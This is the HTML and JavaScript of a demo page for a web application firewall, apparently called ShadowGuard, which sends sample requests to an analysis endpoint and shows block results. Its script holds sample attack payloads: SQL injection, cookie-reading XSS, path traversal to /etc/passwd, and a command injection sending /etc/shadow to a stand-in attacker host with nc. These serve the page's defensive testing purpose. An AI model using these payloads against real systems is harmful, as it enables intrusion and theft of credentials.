<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ShadowGuard: Live Demo Request Sending Application</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f8fafc;min-height:100vh;padding:24px}
.container{max-width:820px;margin:0 auto}
h1{font-size:26px;font-weight:700;color:#0f172a;margin-bottom:4px}
.subtitle{color:#64748b;margin-bottom:28px;font-size:14px}
.shield{display:inline-flex;align-items:center;gap:6px;background:#dcfce7;color:#166534;padding:4px 12px;border-radius:20px;font-size:13px;font-weight:600;margin-bottom:24px}
.panel{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:24px;margin-bottom:20px}
.panel h2{font-size:16px;font-weight:600;color:#1e293b;margin-bottom:16px}
input[type=text]{width:100%;padding:10px 14px;border:1px solid #cbd5e1;border-radius:8px;font-size:14px;outline:none;transition:border-color 0.2s}
input[type=text]:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1)}
.row{display:flex;gap:10px;margin-bottom:14px}
button.primary{padding:10px 22px;background:#3b82f6;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer;font-weight:500;transition:background 0.2s}
button.primary:hover{background:#2563eb}
.attack-btns{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px}
.atk{padding:7px 14px;border-radius:8px;font-size:13px;cursor:pointer;font-weight:500;border:none;transition:all 0.2s}
.atk.sqli{background:#fee2e2;color:#991b1b}
.atk.xss{background:#fef3c7;color:#92400e}
.atk.path{background:#ede9fe;color:#5b21b6}
.atk.cmd{background:#dbeafe;color:#1e40af}
.atk.safe{background:#dcfce7;color:#166534}
.result{display:none;margin-top:20px;border-radius:10px;overflow:hidden}
.result.show{display:block;animation:fadeUp 0.3s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.result-header{padding:14px 20px;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px}
.result-header.blocked{background:#fee2e2;color:#991b1b}
.result-header.allowed{background:#dcfce7;color:#166534}
.result-body{background:#fff;border:1px solid #e2e8f0;border-top:none;padding:20px}
.risk-section{margin:12px 0}
.risk-track{height:12px;background:#f1f5f9;border-radius:6px;overflow:hidden;margin-top:6px}
.risk-fill{height:12px;border-radius:6px;background:linear-gradient(90deg,#22c55e 0%,#f59e0b 50%,#ef4444 100%);transition:width 0.5s ease}
.risk-label{font-size:12px;color:#64748b;margin-bottom:4px}
.detail-row{display:flex;gap:6px;margin-bottom:6px;font-size:13px}
.detail-key{color:#64748b;min-width:120px;font-weight:500}
.detail-val{color:#1e293b}
.recs{margin-top:12px;border-top:1px solid #f1f5f9;padding-top:12px}
.recs h4{font-size:13px;font-weight:600;color:#475569;margin-bottom:8px}
.rec-item{padding:7px 10px;background:#f8fafc;border-left:3px solid #3b82f6;border-radius:4px;font-size:12px;margin-bottom:5px;color:#334155}
.payload-box{background:#1e293b;color:#7dd3fc;padding:10px 14px;border-radius:6px;font-family:'Courier New',monospace;font-size:12px;margin:12px 0;word-break:break-all}
.dashboard-link{display:block;text-align:center;padding:12px;background:#0f172a;color:#94a3b8;border-radius:10px;text-decoration:none;font-size:13px;transition:color 0.2s}
.dashboard-link:hover{color:#e2e8f0}
</style>
</head>
<body>
<div class="container">
  <div class="shield">Protected by ShadowGuard</div>
  <h1>ShadowGuard: Live Demo Request Sending Application</h1>
  <p class="subtitle">Every request is inspected by the hybrid ML + OWASP rule engine. Try sending malicious payloads below.</p>

  <div class="panel">
    <h2>Test the WAF</h2>
    <div class="row">
      <input type="text" id="payload-input" placeholder="Enter a search query or a known attack payload..." />
      <button class="primary" onclick="submitPayload()">Analyze</button>
    </div>
    <p style="font-size:12px;color:#94a3b8;margin-bottom:8px">Quick attack payloads:</p>
    <div class="attack-btns">
      <button class="atk sqli"  onclick="load('sqli')">SQL Injection</button>
      <button class="atk xss"   onclick="load('xss')">XSS</button>
      <button class="atk path"  onclick="load('path')">Path Traversal</button>
      <button class="atk cmd"   onclick="load('cmd')">Command Injection</button>
      <button class="atk safe"  onclick="load('safe')">Safe Request</button>
    </div>
    <div class="result" id="result-box">
      <div class="result-header" id="result-header"></div>
      <div class="result-body" id="result-body"></div>
    </div>
  </div>

  <a href="/dashboard" class="dashboard-link">Open Live Dashboard →</a>
</div>
<script>
const samples={
  sqli: "' OR '1'='1' UNION SELECT username,password FROM users--",
  xss:  "<script>alert('XSS: session='+document.cookie)<\/script>",
  path: "../../etc/passwd",
  cmd:  "; cat /etc/shadow | nc attacker.com 1337",
  safe: "search=machine learning tutorial&page=1&sort=relevance",
};
function load(type){document.getElementById('payload-input').value=samples[type];}
async function submitPayload(){
  const p=document.getElementById('payload-input').value.trim();
  if(!p){alert('Enter a payload first.');return;}
  const box=document.getElementById('result-box');
  const header=document.getElementById('result-header');
  const body=document.getElementById('result-body');
  header.innerHTML='<span>⏳</span> Analyzing...';
  header.className='result-header';
  box.classList.add('show');
  try{
    const r=await fetch('/api/analyze',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({payload:p,url:'/demo?q='+encodeURIComponent(p),method:'GET'})});
    const d=await r.json();
    const blocked=d.action==='BLOCKED';
    header.innerHTML=`<span>${blocked?'🚫':'✅'}</span> ${d.action}: ${d.attack_type}`;
    header.className='result-header '+(blocked?'blocked':'allowed');
    const riskColor=d.risk_score>75?'#ef4444':d.risk_score>40?'#f59e0b':'#22c55e';
    let recs='';
    if(d.recommendations&&d.recommendations.length){
      recs=`<div class="recs"><h4>🔧 Developer Recommendations</h4>${d.recommendations.map(r=>`<div class="rec-item">${r}</div>`).join('')}</div>`;
    }
    body.innerHTML=`
      <div class="risk-section">
        <div class="risk-label">Risk Score: <strong>${d.risk_score}%</strong> | ML Confidence: ${d.ml_confidence}%</div>
        <div class="risk-track"><div class="risk-fill" style="width:${d.risk_score}%;max-width:100%"></div></div>
      </div>
      <div style="margin:12px 0">
        <div class="detail-row"><span class="detail-key">Severity</span><span class="detail-val">${d.severity}</span></div>
        <div class="detail-row"><span class="detail-key">Rule Triggered</span><span class="detail-val">${d.triggered_rule}</span></div>
        <div class="detail-row"><span class="detail-key">Detection Source</span><span class="detail-val">${d.detection_source||'hybrid'}</span></div>
        <div class="detail-row"><span class="detail-key">Latency</span><span class="detail-val">${d.latency_ms}ms</span></div>
      </div>
      <div class="payload-box">${p.replace(/</g,'&lt;')}</div>
      <p style="font-size:13px;color:#475569">${d.description}</p>
      ${recs}
    `;
  }catch(e){
    header.innerHTML='Error: Is the WAF running? (python app.py)';
    header.className='result-header blocked';
    body.innerHTML=`<p style="color:#ef4444;font-size:13px">${e.message}</p>`;
  }
}
document.getElementById('payload-input').addEventListener('keydown',e=>{if(e.key==='Enter')submitPayload();});
</script>
</body>
</html>
